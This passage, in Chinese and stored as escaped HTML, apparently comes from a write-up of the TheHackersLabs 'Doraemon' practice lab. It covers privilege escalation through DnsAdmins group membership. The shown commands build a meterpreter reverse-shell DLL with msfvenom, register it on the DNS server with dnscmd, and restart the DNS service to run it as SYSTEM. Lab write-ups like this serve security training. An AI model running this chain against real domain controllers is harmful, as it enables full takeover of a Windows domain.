003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e在 \u003ccode\u003eHackTricks\u003c/code\u003e 中能找到利用方法：\u003ca href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\"\u003ehttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDnsAdmins\u003c/strong\u003e 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 \u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e生成反弹 \u003ccode\u003eshell\u003c/code\u003e DLL\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: OMG.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用以下命令使 \u003ccode\u003eDNS\u003c/code\u003e 服务器加载任意 \u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e*Evil-WinRM* PS C:\\tools\u003e dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\\tools\\OMG.dll\n\nPropiedad del Registro serverlevelplugindll restablecida correctamente.\nComando completado correctamente.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后重启服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003esc.exe \\\\WIN-VRU3GG3DPLJ stop dns\nsc.exe \\\\WIN-VRU3GG3DPLJ start dns\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image6.png\" alt
